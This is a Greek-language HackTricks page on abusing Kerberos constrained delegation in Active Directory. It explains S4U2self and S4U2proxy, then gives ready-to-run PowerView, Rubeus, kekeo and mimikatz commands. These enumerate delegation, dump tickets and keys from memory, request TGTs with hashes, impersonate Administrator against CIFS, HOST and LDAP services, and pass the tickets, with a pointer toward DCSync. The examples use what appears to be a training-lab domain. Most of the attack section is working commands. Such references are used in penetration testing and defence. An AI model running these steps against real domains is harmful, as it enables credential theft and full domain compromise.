# Περιορισμένη Ανάθεση

<details>

<summary><strong>Μάθετε το χάκινγκ του AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Άλλοι τρόποι για να υποστηρίξετε το HackTricks:

* Εάν θέλετε να δείτε την **εταιρεία σας να διαφημίζεται στο HackTricks** ή να **κατεβάσετε το HackTricks σε μορφή PDF** ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ανακαλύψτε [**την Οικογένεια PEASS**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Εγγραφείτε στη** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στη [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Μοιραστείτε τα χάκινγκ τρικς σας υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια του github.

</details>

## Περιορισμένη Ανάθεση

Χρησιμοποιώντας αυτό, ένας διαχειριστής του τομέα μπορεί να **επιτρέψει** σε έναν υπολογιστή να **προσομοιώσει έναν χρήστη ή υπολογιστή** εναντίον ενός **υπηρεσίας** ενός μηχανήματος.

* **Υπηρεσία για τον χρήστη για τον εαυτό του (**_**S4U2self**_**):** Εάν ένας **λογαριασμός υπηρεσίας** έχει μια τιμή _userAccountControl_ που περιέχει [TRUSTED\_TO\_AUTH\_FOR\_DELEGATION](https://msdn.microsoft.com/en-us/library/aa772300\(v=vs.85\).aspx) (T2A4D), τότε μπορεί να λάβει ένα TGS για τον εαυτό του (την υπηρεσία) εκ μέρους οποιουδήποτε άλλου χρήστη.
* **Υπηρεσία για τον χρήστη για τον Διαμεσολαβητή(**_**S4U2proxy**_**):** Ένας **λογαριασμός υπηρεσίας** μπορεί να λάβει ένα TGS εκ μέρους οποιουδήποτε χρήστη για την υπηρεσία που έχει οριστεί στο **msDS-AllowedToDelegateTo**. Για να το κάνει αυτό, πρέπει πρώτα να λάβει ένα TGS από αυτόν τον χρήστη για τον εαυτό του, αλλά μπορεί να χρησιμοποιήσει το S4U2self για να λάβει αυτό το TGS πριν ζητήσει το άλλο.

**Σημείωση**: Εάν ένας χρήστης είναι σημειωμένος ως "_Ο λογαριασμός είναι ευαίσθητος και δεν μπορεί να ανατεθεί_", δεν θα μπορείτε να τον προσομοιώσετε.

Αυτό σημαίνει ότι εάν **καταλάβετε το hash της υπηρεσίας** μπορείτε να **προσομοιώσετε χρήστες** και να αποκτήσετε **πρόσβαση** εκ μέρους τους στην **υπηρεσία που έχει ρυθμιστεί** (δυνατή **ανέλιξη προνομίων**).

Επιπλέον, δεν θα έχετε πρόσβαση μόνο στην υπηρεσία που ο χρήστης μπορεί να προσομοιώσει, αλλά και σε οποιαδήποτε άλλη υπηρεσία, επειδή δεν ελέγχεται το SPN (το όνομα της υπηρεσίας που ζητείται), μόνο τα προνόμια. Επομένως, εάν έχετε πρόσβαση στην **υπηρεσία CIFS** μπορείτε επίσης να έχετε πρόσβαση στην **υπηρεσία HOST** χρησιμοποιώντας την σημαία `/altservice` στο Rubeus.

Επίσης, η πρόσβαση στην **υπηρεσία LDAP στον DC**, είναι αυτό που χρειάζεται για να εκμεταλλευτείτε ένα **DCSync**.

{% code title="Απαρίθμηση" %}
```bash
# Powerview
Get-DomainUser -TrustedToAuth | select userprincipalname, name, msds-allowedtodelegateto
Get-DomainComputer -TrustedToAuth | select userprincipalname, name, msds-allowedtodelegateto

#ADSearch
ADSearch.exe --search "(&(objectCategory=computer)(msds-allowedtodelegateto=*))" --attributes cn,dnshostname,samaccountname,msds-allowedtodelegateto --json
```
{% code title="Λήψη TGT" %}
```bash
# The first step is to get a TGT of the service that can impersonate others
## If you are SYSTEM in the server, you might take it from memory
.\Rubeus.exe triage
.\Rubeus.exe dump /luid:0x3e4 /service:krbtgt /nowrap

# If you are SYSTEM, you might get the AES key or the RC4 hash from memory and request one
## Get AES/RC4 with mimikatz
mimikatz sekurlsa::ekeys

## Request with aes
tgt::ask /user:dcorp-adminsrv$ /domain:dollarcorp.moneycorp.local /aes256:babf31e0d787aac5c9cc0ef38c51bab5a2d2ece608181fb5f1d492ea55f61f05
.\Rubeus.exe asktgt /user:dcorp-adminsrv$ /aes256:babf31e0d787aac5c9cc0ef38c51bab5a2d2ece608181fb5f1d492ea55f61f05 /opsec /nowrap

# Request with RC4
tgt::ask /user:dcorp-adminsrv$ /domain:dollarcorp.moneycorp.local /rc4:8c6264140d5ae7d03f7f2a53088a291d
.\Rubeus.exe asktgt /user:dcorp-adminsrv$ /rc4:cc098f204c5887eaa8253e7c2749156f /outfile:TGT_websvc.kirbi
```
{% endcode %}

{% hint style="warning" %}
Υπάρχουν **άλλοι τρόποι για να αποκτήσετε ένα εισιτήριο TGT** ή το **RC4** ή **AES256** χωρίς να είστε SYSTEM στον υπολογιστή, όπως το Printer Bug και η απεριόριστη ανακατεύθυνση, η ανακατεύθυνση NTLM και η κατάχρηση της υπηρεσίας πιστοποίησης Active Directory Certificate.

**Απλά έχοντας αυτό το εισιτήριο TGT (ή κατακεκρυμμένο) μπορείτε να πραγματοποιήσετε αυτήν την επίθεση χωρίς να διακινδυνεύσετε ολόκληρο τον υπολογιστή.**
{% endhint %}

{% code title="Χρήση του Rubeus" %}
```bash
#Obtain a TGS of the Administrator user to self
.\Rubeus.exe s4u /ticket:TGT_websvc.kirbi /impersonateuser:Administrator /outfile:TGS_administrator

#Obtain service TGS impersonating Administrator (CIFS)
.\Rubeus.exe s4u /ticket:TGT_websvc.kirbi /tgs:TGS_administrator_Administrator@DOLLARCORP.MONEYCORP.LOCAL_to_websvc@DOLLARCORP.MONEYCORP.LOCAL /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /outfile:TGS_administrator_CIFS

#Impersonate Administrator on different service (HOST)
.\Rubeus.exe s4u /ticket:TGT_websvc.kirbi /tgs:TGS_administrator_Administrator@DOLLARCORP.MONEYCORP.LOCAL_to_websvc@DOLLARCORP.MONEYCORP.LOCAL /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /altservice:HOST /outfile:TGS_administrator_HOST

# Get S4U TGS + Service impersonated ticket in 1 cmd (instead of 2)
.\Rubeus.exe s4u /impersonateuser:Administrator /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /user:dcorp-adminsrv$ /ticket:TGT_websvc.kirbi /nowrap

#Load ticket in memory
.\Rubeus.exe ptt /ticket:TGS_administrator_CIFS_HOST-dcorp-mssql.dollarcorp.moneycorp.local
```
{% code title="kekeo + Mimikatz" %}
```bash
#Obtain a TGT for the Constained allowed user
tgt::ask /user:dcorp-adminsrv$ /domain:dollarcorp.moneycorp.local /rc4:8c6264140d5ae7d03f7f2a53088a291d

#Get a TGS for the service you are allowed (in this case time) and for other one (in this case LDAP)
tgs::s4u /tgt:TGT_dcorpadminsrv$@DOLLARCORP.MONEYCORP.LOCAL_krbtgt~dollarcorp.moneycorp.local@DOLLAR CORP.MONEYCORP.LOCAL.kirbi /user:Administrator@dollarcorp.moneycorp.local /service:time/dcorp-dc.dollarcorp.moneycorp.LOCAL|ldap/dcorpdc.dollarcorp.moneycorp.LOCAL

#Load the TGS in memory
Invoke-Mimikatz -Command '"kerberos::ptt TGS_Administrator@dollarcorp.moneycorp.local@DOLLARCORP.MONEYCORP.LOCAL_ldap~ dcorp-dc.dollarcorp.moneycorp.LOCAL@DOLLARCORP.MONEYCORP.LOCAL_ALT.kirbi"'
```
{% endcode %}

[**Περισσότερες πληροφορίες στο ired.team.**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-kerberos-constrained-delegation)

<details>

<summary><strong>Μάθετε το hacking του AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Άλλοι τρόποι για να υποστηρίξετε το HackTricks:

* Εάν θέλετε να δείτε την **εταιρεία σας να διαφημίζεται στο HackTricks** ή να **κατεβάσετε το HackTricks σε μορφή PDF** ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ανακαλύψτε [**την Οικογένεια PEASS**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Εγγραφείτε στη** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στη [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Μοιραστείτε τα hacking tricks σας υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια του github.

</details>
